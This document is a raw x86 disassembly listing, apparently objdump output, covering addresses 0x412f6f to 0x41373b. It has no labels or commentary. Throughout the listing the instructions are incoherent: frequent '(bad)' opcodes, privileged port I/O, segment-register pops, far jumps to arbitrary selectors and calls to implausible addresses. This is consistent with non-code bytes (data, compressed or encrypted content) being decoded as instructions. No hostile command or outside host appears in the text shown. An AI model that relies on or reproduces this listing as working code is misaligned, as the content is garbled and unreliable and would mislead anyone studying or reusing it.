  412f6f:	fst    DWORD PTR [eax+ebx*2-0x434cb1a1]
  412f76:	cmp    eax,0x43316678
  412f7b:	sub    bh,BYTE PTR [edi*2+0x3b00a95b]
  412f82:	cmp    al,0xa7
  412f84:	test   al,0x10
  412f86:	cmp    DWORD PTR [esi],ebp
  412f88:	adc    DWORD PTR [ebx],edi
  412f8a:	imul   esi,DWORD PTR [eax],0x2722dd94
  412f90:	mov    ecx,0xfcd86798
  412f95:	icebp  
  412f96:	xchg   esi,eax
  412f97:	(bad)  
  412f98:	out    dx,al
  412f99:	pop    edx
  412f9a:	nop
  412f9b:	sub    al,0x44
  412f9d:	ins    BYTE PTR es:[edi],dx
  412f9e:	test   BYTE PTR [ebx],cl
  412fa0:	clc    
  412fa1:	idiv   BYTE PTR [ebx+0x74e5209a]
  412fa7:	mov    ah,0x5b
  412fa9:	fwait
  412faa:	or     al,0x5
  412fac:	xor    bl,BYTE PTR [eax+0x19]
  412faf:	xchg   edi,eax
  412fb0:	xor    al,0x36
  412fb2:	rcl    cl,cl
  412fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412fb5:	mov    eax,0x48b488a
  412fba:	pop    ss
  412fbb:	(bad)  
  412fbc:	cmc    
  412fbd:	pop    ds
  412fbe:	or     DWORD PTR [ebp+0x9],edx
  412fc1:	js     0x412f74
  412fc3:	repz push ebp
  412fc5:	or     DWORD PTR [edx-0x7d9d8599],esi
  412fcb:	xchg   esi,eax
  412fcc:	inc    edx
  412fcd:	xlat   BYTE PTR ds:[ebx]
  412fce:	pushf  
  412fcf:	in     eax,dx
  412fd0:	popa   
  412fd1:	test   al,0x82
  412fd3:	scas   al,BYTE PTR es:[edi]
  412fd4:	je     0x413046
  412fd6:	mov    ds:0x7af32f68,eax
  412fdb:	inc    esi
  412fdc:	test   DWORD PTR [edi+0xf213b30],eax
  412fe2:	push   ebp
  412fe3:	retf   
  412fe4:	into   
  412fe5:	outs   dx,BYTE PTR ds:[esi]
  412fe6:	pop    ss
  412fe7:	xchg   edx,eax
  412fe8:	mov    ecx,0xb7adc21c
  412fed:	adc    eax,0x96514eb5
  412ff2:	rol    DWORD PTR [esi-0x5],cl
  412ff5:	sub    ah,BYTE PTR [esi+0x1b]
  412ff8:	inc    ebp
  412ff9:	mov    eax,ds:0xcecfbf64
  412ffe:	mov    bl,0x32
  413000:	mov    bl,0xb7
  413002:	and    eax,0xfa089ff8
  413007:	shr    DWORD PTR [ecx-0x13],cl
  41300a:	mov    WORD PTR [ebp-0x2c],ds
  41300d:	leave  
  41300e:	neg    BYTE PTR [esi-0x2920b58c]
  413014:	pop    ds
  413015:	enter  0x117f,0x17
  413019:	and    BYTE PTR [eax],cl
  41301b:	int3   
  41301c:	test   eax,0x95440280
  413021:	and    al,0xf1
  413023:	or     bh,ah
  413025:	cmp    esp,DWORD PTR [eax+0x50]
  413028:	pop    ebx
  413029:	sbb    BYTE PTR [edi],dl
  41302b:	addr16 jbe 0x413081
  41302e:	mov    DWORD PTR [esi-0x6e],edi
  413031:	dec    edx
  413032:	es jns 0x413034
  413035:	fwait
  413036:	dec    ecx
  413037:	or     cl,ch
  413039:	add    DWORD PTR [esi+0x88ef291],esi
  41303f:	(bad)  
  413040:	pop    ds
  413041:	mov    ch,0x2e
  413043:	arpl   WORD PTR [ebx+0x77ceae87],cx
  413049:	sti    
  41304a:	ja     0x41308c
  41304c:	jecxz  0x413049
  41304e:	into   
  41304f:	out    0xfe,eax
  413051:	jns    0x413000
  413053:	xchg   esp,eax
  413054:	les    esp,FWORD PTR [edi+ebx*4+0x6]
  413058:	cmp    esp,ebp
  41305a:	inc    edx
  41305b:	lds    edi,FWORD PTR [ebx]
  41305d:	xchg   esi,eax
  41305e:	inc    edx
  41305f:	inc    ebx
  413060:	cmp    al,0xf2
  413062:	gs dec esp
  413064:	pop    esp
  413065:	imul   edi,DWORD PTR [edi-0x2b7f9bd0],0xed998ffb
  41306f:	outs   dx,BYTE PTR ds:[esi]
  413070:	dec    edx
  413071:	cld    
  413072:	cmp    bl,bl
  413074:	pushf  
  413075:	mov    esp,0x73dfb0bc
  41307a:	lock outs dx,BYTE PTR ds:[esi]
  41307c:	xlat   BYTE PTR ds:[ebx]
  41307d:	xchg   esi,eax
  41307e:	and    eax,0x12024b2e
  413083:	data16 jo 0x413006
  413086:	call   0x13416e95
  41308b:	lods   eax,DWORD PTR ds:[esi]
  41308c:	jecxz  0x413013
  41308e:	sub    bh,BYTE PTR [ecx+ecx*8]
  413091:	stos   BYTE PTR es:[edi],al
  413092:	pop    eax
  413093:	adc    DWORD PTR [esi+0x629f8dce],ecx
  413099:	pop    ss
  41309a:	mov    esp,0x853398ee
  41309f:	mov    al,0xab
  4130a1:	ins    DWORD PTR es:[edi],dx
  4130a2:	adc    al,0x27
  4130a4:	rcr    BYTE PTR [edi-0x5],cl
  4130a7:	mov    ch,0xf1
  4130a9:	fs mov edi,0x579700e3
  4130af:	push   0x30
  4130b1:	hlt    
  4130b2:	inc    ecx
  4130b3:	rcr    BYTE PTR [edx+esi*4-0x2f919036],cl
  4130ba:	jae    0x413094
  4130bc:	sar    BYTE PTR [edi],0x6
  4130bf:	xor    al,0xa6
  4130c1:	xor    esp,DWORD PTR [edi]
  4130c3:	mov    al,ds:0x7f8e5dfb
  4130c8:	push   ebx
  4130c9:	cmp    BYTE PTR [esi+ebp*8-0x103a20b9],0x42
  4130d1:	push   esp
  4130d2:	adc    BYTE PTR [ebx-0x5b78c3fc],ch
  4130d8:	mov    ch,dh
  4130da:	clc    
  4130db:	lods   eax,DWORD PTR ds:[esi]
  4130dc:	lock es in eax,0x6b
  4130e0:	add    al,0x99
  4130e2:	ret    
  4130e3:	cmp    BYTE PTR [eax-0x79de9791],bh
  4130e9:	jp     0x41309c
  4130eb:	fnsave [ebx]
  4130ed:	daa    
  4130ee:	xchg   esi,eax
  4130ef:	cwde   
  4130f0:	ins    BYTE PTR es:[edi],dx
  4130f1:	or     BYTE PTR [esi+ecx*2],ch
  4130f4:	sbb    al,0x49
  4130f6:	(bad)  
  4130f7:	ficomp WORD PTR [edx]
  4130f9:	sbb    cl,BYTE PTR [eax]
  4130fb:	and    eax,0x867ec5c6
  413100:	ins    BYTE PTR es:[edi],dx
  413101:	mov    bh,0x29
  413103:	jae    0x4130d4
  413105:	ficomp WORD PTR [edi+0x7b]
  413108:	call   0x1689:0xe1788464
  41310f:	xor    eax,0x9e1b7a15
  413114:	mov    ebx,0x66b78fdb
  413119:	and    al,0x33
  41311b:	shl    BYTE PTR [esi-0x56612846],cl
  413121:	lea    esp,[ebx]
  413123:	cmp    al,0xef
  413125:	and    edi,DWORD PTR [esi]
  413127:	iret   
  413128:	inc    ebp
  413129:	sub    ch,al
  41312b:	clc    
  41312c:	adc    edx,DWORD PTR [esi-0x486b3c56]
  413132:	mov    esi,0x949e16ae
  413137:	xor    BYTE PTR [eax+0x54e3fb5f],ah
  41313d:	paddw  mm2,mm0
  413140:	push   ebx
  413141:	and    al,0x6e
  413143:	daa    
  413144:	dec    edi
  413145:	pusha  
  413146:	out    0x17,eax
  413148:	retf   
  413149:	test   eax,0xe2c06569
  41314e:	dec    esp
  41314f:	test   BYTE PTR [eax-0x6b],bh
  413152:	mov    ecx,0x7ba4278c
  413157:	dec    ebp
  413158:	mov    ebp,0xddbae2b2
  41315d:	xchg   cl,bh
  41315f:	and    al,0x2
  413161:	lds    esi,FWORD PTR [edi-0x54069690]
  413167:	mov    bh,0xac
  413169:	jno    0x413162
  41316b:	sahf   
  41316c:	dec    eax
  41316d:	ja     0x413111
  41316f:	stos   DWORD PTR es:[edi],eax
  413170:	jmp    0xe452:0x219703f4
  413177:	into   
  413178:	out    0x27,al
  41317a:	mov    eax,0x477369ce
  41317f:	out    dx,eax
  413180:	push   ecx
  413181:	xor    ch,ch
  413183:	lods   al,BYTE PTR ds:[esi]
  413184:	lahf   
  413185:	mov    DWORD PTR [eax+0x1edc3abd],esi
  41318b:	xor    eax,esi
  41318d:	push   0xffffffbd
  41318f:	jbe    0x41320f
  413191:	inc    ebp
  413192:	dec    eax
  413193:	cmp    al,0x92
  413195:	sub    edi,esi
  413197:	sbb    eax,0x8821e332
  41319c:	lock xchg edx,eax
  41319e:	push   ecx
  41319f:	aad    0xd7
  4131a1:	repz clc 
  4131a3:	inc    esi
  4131a4:	xchg   edi,eax
  4131a5:	xor    ecx,DWORD PTR [bx+si-0x4f]
  4131a9:	call   0x4ecb701b
  4131ae:	push   ss
  4131af:	mov    eax,0xc6d58936
  4131b4:	mov    ds:0x5c43202c,eax
  4131b9:	mov    ds:0xf9fd24b4,al
  4131be:	es pop eax
  4131c0:	and    ecx,0x2f
  4131c3:	in     eax,0x59
  4131c5:	inc    ebp
  4131c6:	push   es
  4131c7:	xor    BYTE PTR [edi],0x36
  4131ca:	and    ebp,DWORD PTR [eax-0x763c081f]
  4131d0:	or     ecx,ebp
  4131d2:	popa   
  4131d3:	outs   dx,BYTE PTR ds:[esi]
  4131d4:	dec    ebx
  4131d5:	popa   
  4131d6:	(bad)  
  4131d7:	lock xchg ebp,eax
  4131d9:	fcomi  st,st(1)
  4131db:	lahf   
  4131dc:	mov    BYTE PTR [ebx+0xe],ah
  4131df:	mov    bh,0xae
  4131e1:	mov    al,ds:0x167c2323
  4131e6:	push   ds
  4131e7:	sahf   
  4131e8:	pop    ss
  4131e9:	or     DWORD PTR [ebp+0x688205da],esi
  4131ef:	and    eax,0xfd30482e
  4131f4:	inc    esp
  4131f5:	add    dl,BYTE PTR [esi]
  4131f7:	je     0x4131ff
  4131f9:	sbb    bl,BYTE PTR [eax+0x6c]
  4131fc:	xor    eax,ecx
  4131fe:	ret    0x2c25
  413201:	std    
  413202:	dec    ebp
  413203:	jl     0x413245
  413205:	dec    edx
  413206:	adc    al,0x8d
  413208:	mov    DWORD PTR [edi],ebp
  41320a:	cmp    bl,BYTE PTR ss:[eax]
  41320d:	xor    edi,edx
  41320f:	sub    eax,0xdde0c897
  413214:	and    DWORD PTR [esi-0x76],0x12faa2c
  41321b:	mov    BYTE PTR [ecx],0x42
  41321e:	fistp  QWORD PTR [edx-0x36]
  413221:	mov    WORD PTR [esi-0x80],fs
  413224:	xor    eax,0x8bc069ea
  413229:	inc    edi
  41322a:	fs (bad) 
  41322c:	push   0xffffffd2
  41322e:	sbb    edx,ecx
  413230:	mov    bh,0x55
  413232:	add    DWORD PTR [edx+esi*4],0x8329baf5
  413239:	jmp    FWORD PTR [edi]
  41323b:	jmp    0x39b2:0xb98465c3
  413242:	out    0x16,eax
  413244:	cli    
  413245:	shr    DWORD PTR [eax-0x4e7d5103],0xe1
  41324c:	mov    dh,0x6b
  41324e:	stos   DWORD PTR es:[edi],eax
  41324f:	mov    esi,0xe009e2d3
  413254:	and    BYTE PTR [eax-0x63],dl
  413257:	pop    esp
  413258:	mov    ch,0x2b
  41325a:	scas   al,BYTE PTR es:[edi]
  41325b:	push   ebp
  41325c:	ror    BYTE PTR [eax-0x59ee6933],0xab
  413263:	mov    ecx,DWORD PTR [eax]
  413265:	mov    eax,0x4ab5d29
  41326a:	pop    ebx
  41326b:	(bad)
  41326f:	adc    esp,DWORD PTR [ebx]
  413271:	int3   
  413272:	add    cl,BYTE PTR [ebx+0x4aa1f3a1]
  413278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413279:	inc    edi
  41327a:	bnd ja 0x4132eb
  41327d:	es mov eax,0x3df7fb38
  413283:	out    dx,eax
  413284:	push   esi
  413285:	and    al,0x39
  413287:	sbb    DWORD PTR ds:0x846c51ea,esi
  41328d:	adc    BYTE PTR [esi+0x6c],bh
  413290:	xchg   edi,eax
  413291:	enter  0xde4a,0xc7
  413295:	aam    0xb1
  413297:	push   esi
  413298:	dec    ebx
  413299:	popa   
  41329a:	dec    eax
  41329b:	jo     0x41323c
  41329d:	xchg   BYTE PTR [eax],bh
  41329f:	or     DWORD PTR [edi+edi*4-0x69],edi
  4132a3:	mov    esi,0x94ef26a9
  4132a8:	dec    ecx
  4132a9:	shl    DWORD PTR [edx-0x62],0x5b
  4132ad:	xor    DWORD PTR [edx],0x6d
  4132b0:	push   ecx
  4132b1:	mov    dh,0x72
  4132b3:	dec    esp
  4132b4:	xor    DWORD PTR [ecx-0x15c7f704],ebp
  4132ba:	outs   dx,DWORD PTR ds:[esi]
  4132bb:	sahf   
  4132bc:	push   edi
  4132bd:	ins    BYTE PTR es:[edi],dx
  4132be:	jl     0x4132b6
  4132c0:	jge    0x41332e
  4132c2:	frstor [esi]
  4132c4:	sbb    edx,ebx
  4132c6:	push   esp
  4132c7:	dec    esp
  4132c8:	sbb    al,0x51
  4132ca:	push   esi
  4132cb:	sar    BYTE PTR [edi],1
  4132cd:	push   ebx
  4132ce:	imul   esp,DWORD PTR [ebx+ecx*4-0x2f506a4a],0xffffff96
  4132d6:	or     BYTE PTR [edx],bl
  4132d8:	aad    0x27
  4132da:	fild   DWORD PTR [edi+0x56]
  4132dd:	into   
  4132de:	div    DWORD PTR [edi+ebp*2+0x60ad2308]
  4132e5:	dec    BYTE PTR [ebx+0x519f0f78]
  4132eb:	xor    dh,BYTE PTR [ebx+edi*4-0x38e93f1e]
  4132f2:	xchg   ebp,eax
  4132f3:	lahf   
  4132f4:	xor    DWORD PTR [edx],esi
  4132f6:	and    ebx,eax
  4132f8:	daa    
  4132f9:	jg     0x413359
  4132fb:	int    0xbc
  4132fd:	and    BYTE PTR fs:[eax],dl
  413300:	cmp    BYTE PTR [ebx+ebx*8+0x61af9502],dl
  413307:	mov    bh,0xe3
  413309:	jns    0x413308
  41330b:	jp     0x413368
  41330d:	mov    esp,0x5be0f66d
  413312:	or     BYTE PTR [bp+di+0x56],al
  413316:	aas    
  413317:	sub    al,0x2e
  413319:	mov    ?,WORD PTR [esi]
  41331b:	jecxz  0x41333e
  41331d:	xchg   esp,eax
  41331e:	test   DWORD PTR [ebx],ebx
  413320:	mov    eax,ds:0x2183f4e2
  413325:	adc    ebx,DWORD PTR [esp+ebp*8]
  413328:	xchg   ebx,eax
  413329:	(bad)  
  41332a:	sahf   
  41332b:	shl    DWORD PTR [eax+0x7],0xf
  41332f:	adc    ah,al
  413331:	mov    ebp,0x4b320929
  413336:	jecxz  0x4132eb
  413338:	cli    
  413339:	sub    DWORD PTR [ebp+0x69f5c596],edi
  41333f:	stos   DWORD PTR es:[edi],eax
  413340:	repz enter 0xb9ff,0x38
  413345:	mov    dl,0x89
  413347:	push   ds
  413348:	ins    DWORD PTR es:[edi],dx
  413349:	or     DWORD PTR [edi-0x43],ebp
  41334c:	cmp    eax,0x397d710c
  413351:	push   ebp
  413352:	sbb    BYTE PTR [edi-0x3336d7bd],bh
  413358:	sahf   
  413359:	loope  0x41333e
  41335b:	(bad)  
  41335c:	pop    ebp
  41335d:	push   ecx
  41335e:	pop    edi
  41335f:	(bad)  [eax+0x63]
  413362:	jae    0x4133b4
  413364:	adc    BYTE PTR [eax],dl
  413366:	sti    
  413367:	test   DWORD PTR ds:0xf96edc6f,ebx
  41336d:	rcl    ebp,0xd3
  413370:	inc    edx
  413371:	push   0x7b
  413373:	and    al,bh
  413375:	or     BYTE PTR [eax],bh
  413377:	shl    DWORD PTR [edi],cl
  413379:	mov    BYTE PTR [edi+eax*1],ch
  41337c:	call   0x59d4f3ca
  413381:	mov    eax,ds:0x9b4ae6bd
  413386:	mov    dh,0xe6
  413388:	dec    esp
  413389:	xchg   esp,eax
  41338a:	cs pop ds
  41338c:	mov    al,0x99
  41338e:	iret   
  41338f:	jne    0x413356
  413391:	cmp    eax,0x187859ee
  413396:	into   
  413397:	xrelease mov DWORD PTR [ecx],esi
  41339a:	pop    eax
  41339b:	clc    
  41339c:	pop    esi
  41339d:	icebp  
  41339e:	sbb    eax,0x60014401
  4133a3:	cmp    esi,DWORD PTR [bp-0x7f]
  4133a7:	shl    BYTE PTR [ecx-0x5e2b4ad9],0x43
  4133ae:	hlt    
  4133af:	(bad)  
  4133b0:	out    0x4a,eax
  4133b2:	fbstp  TBYTE PTR [ebx+0x36ded632]
  4133b8:	sbb    DWORD PTR [ebx+0x4b175729],0xffffffe1
  4133bf:	mov    ah,0x8a
  4133c1:	es (bad) 
  4133c4:	sub    eax,DWORD PTR [ebx-0xed1963f]
  4133ca:	xor    ebx,esp
  4133cc:	ins    BYTE PTR es:[edi],dx
  4133cd:	retf   0x620d
  4133d0:	test   BYTE PTR [ebp-0x17],bl
  4133d3:	and    DWORD PTR [ebx+0xba9d947],esp
  4133d9:	inc    eax
  4133da:	jno    0x41341d
  4133dc:	ret    
  4133dd:	ins    DWORD PTR es:[edi],dx
  4133de:	sub    dh,al
  4133e0:	cmp    eax,0x39482aad
  4133e5:	out    dx,al
  4133e6:	mov    al,0x47
  4133e8:	cwde   
  4133e9:	es or  al,0xde
  4133ec:	popa   
  4133ed:	daa    
  4133ee:	sub    BYTE PTR [eax+ebp*8],al
  4133f1:	jmp    FWORD PTR [edi]
  4133f3:	aaa    
  4133f4:	ss fxch st(5)
  4133f7:	in     al,dx
  4133f8:	xor    BYTE PTR [ecx],dl
  4133fa:	push   edi
  4133fb:	mov    ebp,0x3de29c04
  413400:	push   ebx
  413401:	daa    
  413402:	add    DWORD PTR [esi],ebx
  413404:	adc    esp,DWORD PTR [edx+0x5c]
  413407:	(bad)  
  413408:	cmp    bh,dh
  41340a:	or     eax,0xb38b9ccd
  41340f:	xchg   esi,eax
  413410:	in     al,0x3c
  413412:	scas   al,BYTE PTR es:[edi]
  413413:	sahf   
  413414:	mov    dh,0x23
  413416:	hlt    
  413417:	xchg   edi,eax
  413418:	dec    edx
  413419:	adc    DWORD PTR [edx+0x203d90e0],edx
  41341f:	out    0x2,eax
  413421:	mov    ebx,0x6eb85bd1
  413426:	jno    0x41348b
  413428:	fmul   QWORD PTR [ebx-0x26]
  41342b:	sub    BYTE PTR [esi],dl
  41342d:	sahf   
  41342e:	repz xchg edi,eax
  413430:	pop    ebp
  413431:	push   0x62
  413433:	dec    edi
  413434:	xchg   esp,eax
  413435:	inc    ecx
  413436:	outs   dx,BYTE PTR ds:[esi]
  413437:	mov    cl,0x64
  413439:	dec    esi
  41343a:	inc    ecx
  41343b:	push   edx
  41343c:	test   BYTE PTR [edx+0xb],al
  41343f:	add    ch,BYTE PTR [eax-0x16]
  413442:	dec    ebx
  413443:	repnz fbstp TBYTE PTR [edi]
  413446:	or     bh,BYTE PTR [eax+0x28]
  413449:	outs   dx,DWORD PTR ds:[esi]
  41344a:	adc    DWORD PTR [ecx],edi
  41344c:	push   ecx
  41344d:	push   edi
  41344e:	dec    ecx
  41344f:	mov    eax,ds:0x17d72566
  413454:	sub    al,0xcf
  413456:	jne    0x413428
  413458:	push   ds
  413459:	xor    ax,0xb0c1
  41345d:	icebp  
  41345e:	leave  
  41345f:	sub    dl,al
  413461:	call   0xe86464ea
  413466:	mov    ch,0x89
  413468:	push   ds
  413469:	mov    al,0x3f
  41346b:	xchg   ebx,eax
  41346c:	pushf  
  41346d:	xlat   BYTE PTR ds:[ebx]
  41346e:	enter  0x9097,0xcc
  413472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413473:	out    0x63,eax
  413475:	push   edx
  413476:	push   0x2bb84597
  41347b:	imul   ecx,DWORD PTR [edx+0x1406534e],0x4a4733
  413485:	lahf   
  413486:	fisttp WORD PTR [ebx+edx*1+0x1f]
  41348a:	lock mov DWORD PTR [edi+0xd],ecx
  41348e:	sbb    BYTE PTR [ebx],dl
  413490:	push   0xe3f199ee
  413495:	xor    al,0xab
  413497:	xor    dh,BYTE PTR [ecx+0x21]
  41349a:	mov    edi,0x2de8f9ee
  41349f:	inc    esi
  4134a0:	(bad)  [edi]
  4134a2:	push   ds
  4134a3:	cdq    
  4134a4:	lahf   
  4134a5:	mov    bl,bh
  4134a7:	aas    
  4134a8:	mov    cs,WORD PTR [esi+0x5a]
  4134ab:	call   0xd3728aff
  4134b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134b1:	pushf  
  4134b2:	xchg   ecx,eax
  4134b3:	jae    0x413450
  4134b5:	cmp    ebx,DWORD PTR [edi]
  4134b7:	and    al,0x5c
  4134b9:	mov    DWORD PTR ds:0x9296e1b0,esp
  4134bf:	scas   al,BYTE PTR es:[edi]
  4134c0:	add    DWORD PTR [ebx-0x259d450],esi
  4134c6:	rol    BYTE PTR [ebp+eax*2-0x14],0x56
  4134cb:	aas    
  4134cc:	nop
  4134cd:	mov    ebp,DWORD PTR [ebx-0x4d]
  4134d0:	enter  0xa4c8,0xf4
  4134d4:	orps   xmm1,XMMWORD PTR [ebx]
  4134d7:	pop    esp
  4134d8:	mov    eax,0xf123ade6
  4134dd:	xchg   edx,eax
  4134de:	mov    al,0xc7
  4134e0:	lods   eax,DWORD PTR ds:[esi]
  4134e1:	inc    ebp
  4134e2:	ja     0x4134db
  4134e4:	jb     0x413542
  4134e6:	mov    ecx,0x67affb63
  4134eb:	clc    
  4134ec:	dec    edx
  4134ed:	mov    esi,0xce6c1cfb
  4134f2:	and    BYTE PTR [esi],ah
  4134f4:	outs   dx,DWORD PTR ds:[esi]
  4134f5:	sub    al,0x27
  4134f7:	test   BYTE PTR [ebp-0x14c80e2f],dl
  4134fd:	ror    ch,0xbe
  413500:	xor    eax,0x9910bc50
  413505:	or     BYTE PTR [ebx],bl
  413507:	fstp   st(1)
  413509:	retf   
  41350a:	addr16 test eax,0x71eae91c
  413510:	(bad)  
  413511:	mov    ch,0x7d
  413513:	sub    al,0xfb
  413515:	xchg   DWORD PTR [ecx+0x5c],ecx
  413518:	add    bh,BYTE PTR [ecx+eiz*8-0x6b17cd49]
  41351f:	xchg   BYTE PTR es:[ecx+0x3da7967e],bl
  413526:	jp     0x41352f
  413528:	push   ss
  413529:	out    0xb6,al
  41352b:	pop    edi
  41352c:	popf   
  41352d:	add    edi,DWORD PTR [ebx+eiz*1+0x3c]
  413531:	push   edi
  413532:	sub    eax,0x1be15e0
  413537:	sub    DWORD PTR [esi],0xa5d341b3
  41353d:	and    DWORD PTR [edi],ebp
  41353f:	and    ecx,edx
  413541:	push   0x1b4d1d65
  413546:	out    dx,al
  413547:	add    edx,DWORD PTR [edi+0x63e6a5cb]
  41354d:	mov    ch,0xae
  41354f:	mov    bh,0xd1
  413551:	sbb    edx,DWORD PTR [ebp-0x52bf00e2]
  413557:	aam    0xb3
  413559:	loop   0x4134fd
  41355b:	xchg   esi,eax
  41355c:	inc    esi
  41355d:	jmp    FWORD PTR [edi-0x61]
  413560:	adc    al,0x6b
  413562:	xchg   esi,eax
  413563:	icebp  
  413564:	inc    esp
  413565:	cdq    
  413566:	add    dl,al
  413568:	dec    esp
  413569:	push   ds
  41356a:	and    esi,DWORD PTR [ecx+0x5d]
  41356d:	test   DWORD PTR [esi+edx*2+0x12],edi
  413571:	jmp    0x54068570
  413576:	adc    al,0xb1
  413578:	retf   
  413579:	lock int3 
  41357b:	les    ebp,FWORD PTR [edi-0x14]
  41357e:	adc    bl,ch
  413580:	popa   
  413581:	in     al,0xe7
  413583:	cmp    BYTE PTR [ecx+0x14296fd1],ah
  413589:	outs   dx,DWORD PTR ds:[esi]
  41358a:	sbb    eax,0x729c33fc
  41358f:	dec    ebx
  413590:	pop    esp
  413591:	daa    
  413592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413593:	sbb    BYTE PTR [edx-0x1a],0x2e
  413597:	sbb    edx,DWORD PTR [ecx+0x6d3f50f5]
  41359d:	scas   eax,DWORD PTR es:[edi]
  41359e:	(bad)  
  41359f:	pop    edi
  4135a0:	(bad)  [ecx]
  4135a2:	fistp  QWORD PTR [ecx]
  4135a4:	and    DWORD PTR [ecx],ebx
  4135a6:	(bad)  
  4135a7:	out    dx,al
  4135a8:	int    0x4a
  4135aa:	or     BYTE PTR [edi+0x41],al
  4135ad:	add    DWORD PTR [ecx],ecx
  4135af:	loop   0x4135dd
  4135b1:	pop    ecx
  4135b2:	lods   al,BYTE PTR ds:[esi]
  4135b3:	(bad)  
  4135b4:	idiv   BYTE PTR [esi+0x54]
  4135b7:	pop    ebx
  4135b8:	daa    
  4135b9:	test   BYTE PTR [eax],dl
  4135bb:	dec    BYTE PTR [ebx+0x70]
  4135be:	and    eax,esi
  4135c0:	push   edx
  4135c1:	pop    eax
  4135c2:	dec    esp
  4135c3:	or     DWORD PTR [edx-0x28],ebp
  4135c6:	inc    edi
  4135c7:	or     DWORD PTR [edx],0x33072b2d
  4135cd:	mov    ch,BYTE PTR [edi-0x40d68168]
  4135d3:	loopne 0x4135ae
  4135d5:	retf   
  4135d6:	in     eax,dx
  4135d7:	push   0xd95aa6ea
  4135dc:	xchg   esp,eax
  4135dd:	push   esi
  4135de:	adc    al,0x5
  4135e0:	xlat   BYTE PTR ds:[ebx]
  4135e1:	(bad)  
  4135e2:	jns    0x4135d0
  4135e4:	out    dx,eax
  4135e5:	mov    ch,0xdb
  4135e7:	pop    esp
  4135e8:	lahf   
  4135e9:	ret    
  4135ea:	jnp    0x4135f5
  4135ec:	aaa    
  4135ed:	gs mov edi,0x87c17839
  4135f3:	jne    0x413668
  4135f5:	inc    BYTE PTR [edx-0x7e]
  4135f8:	idiv   BYTE PTR [esi]
  4135fa:	mov    ah,0xd0
  4135fc:	adc    edx,DWORD PTR [eax]
  4135fe:	repnz sbb eax,0x6c2f9666
  413604:	pop    esp
  413605:	xchg   ebp,eax
  413606:	add    al,0x1f
  413608:	out    dx,eax
  413609:	dec    ecx
  41360a:	lea    edx,[ebx+0x38]
  41360d:	leave  
  41360e:	pop    edx
  41360f:	sti    
  413610:	sub    ebp,ebx
  413612:	test   DWORD PTR ds:0x1c9fbc5b,ebx
  413618:	cmp    BYTE PTR [ebx-0x620a0e06],cl
  41361e:	pop    ebp
  41361f:	xor    eax,0xcfe22579
  413624:	mov    ebp,0x2a723d91
  413629:	cld    
  41362a:	retf   
  41362b:	(bad)  
  41362c:	mov    ecx,es
  41362e:	pop    es
  41362f:	arpl   si,sp
  413631:	add    al,0xe
  413633:	cmp    eax,DWORD PTR ds:0x7bad6c7
  413639:	pushf  
  41363a:	xor    eax,0xf0e218a
  41363f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413640:	jecxz  0x413633
  413642:	jo     0x413659
  413644:	fsubr  QWORD PTR [esi+0x21]
  413647:	data16 fwait
  413649:	stc    
  41364a:	push   edi
  41364b:	jp     0x413691
  41364d:	call   0xd1af7f3
  413652:	mul    BYTE PTR [esp+edi*2]
  413655:	int    0x21
  413657:	mov    esi,0x3fe0e2c1
  41365c:	mov    al,0x82
  41365e:	lahf   
  41365f:	jle    0x41361a
  413661:	js     0x413692
  413663:	inc    ebp
  413664:	repnz out dx,eax
  413666:	into   
  413667:	sbb    al,0x84
  413669:	inc    esp
  41366a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41366b:	jmp    0x2f28:0xb78abcf9
  413672:	pop    ds
  413673:	bound  ebx,QWORD PTR [ebx-0x72176b1d]
  413679:	jl     0x413650
  41367b:	sahf   
  41367c:	mov    ebp,0xaccc799a
  413681:	mov    al,0xfc
  413683:	fcomi  st,st(3)
  413685:	push   DWORD PTR [ebp+0x4bcd99a5]
  41368b:	lea    edx,[edx-0x67780c1b]
  413691:	div    DWORD PTR [ebp*2-0x12f5f0dd]
  413698:	cmp    BYTE PTR [edi+0x2170f94],0x45
  41369f:	out    dx,eax
  4136a0:	mov    bh,0xf7
  4136a2:	mov    eax,0x83134eb7
  4136a7:	ins    BYTE PTR es:[edi],dx
  4136a8:	xchg   ebp,eax
  4136a9:	dec    esp
  4136aa:	lds    edx,FWORD PTR [ebp-0x572b0bcd]
  4136b0:	fwait
  4136b1:	scas   al,BYTE PTR es:[edi]
  4136b2:	or     eax,0x6fbe76a5
  4136b7:	imul   ebp,DWORD PTR [esi-0x49c6028],0x22
  4136be:	sbb    al,0x8
  4136c0:	sti    
  4136c1:	mov    bh,BYTE PTR [edx-0x10]
  4136c4:	mov    ds:0x8f084f7a,eax
  4136c9:	cwde   
  4136ca:	aad    0x9b
  4136cc:	and    DWORD PTR [esi-0x78553a1c],ebx
  4136d2:	test   eax,0xe9c857b7
  4136d7:	stos   DWORD PTR es:[edi],eax
  4136d8:	mov    ebp,0x2208fc64
  4136dd:	jnp    0x413677
  4136df:	jae    0x413755
  4136e1:	mov    ds,WORD PTR [edi]
  4136e3:	cli    
  4136e4:	xor    dl,cl
  4136e6:	and    DWORD PTR [eax-0x5ae612c3],ebx
  4136ec:	test   eax,0x2dad0b
  4136f1:	out    dx,al
  4136f2:	add    edx,DWORD PTR [eax+eiz*1-0x4d]
  4136f6:	ds (bad) 
  4136f8:	cwde   
  4136f9:	xlat   BYTE PTR ds:[ebx]
  4136fa:	xor    ebp,DWORD PTR [ebx+0x4d]
  4136fd:	mov    esp,0x5680c92a
  413702:	popa   
  413703:	or     eax,0x94c05deb
  413708:	loopne 0x41371b
  41370a:	and    ebp,ebx
  41370c:	retf   
  41370d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41370e:	je     0x413712
  413710:	push   cs
  413711:	jo     0x413704
  413713:	mov    BYTE PTR [ebx+0x27788ba5],bl
  413719:	jae    0x413782
  41371b:	sahf   
  41371c:	pop    ds
  41371d:	shl    bh,1
  41371f:	int    0xbe
  413721:	add    al,0xf0
  413723:	add    esi,edi
  413725:	xor    BYTE PTR [ebx-0x31a5ac3f],bl
  41372b:	jle    0x413769
  41372d:	bndldx bnd0,[esi-0x32]
  413731:	les    edi,FWORD PTR [esi-0x6e9ca890]
  413737:	ficomp DWORD PTR [esi+0x5]
  41373a:	sahf   
  41373b:	adc    al,0xfd
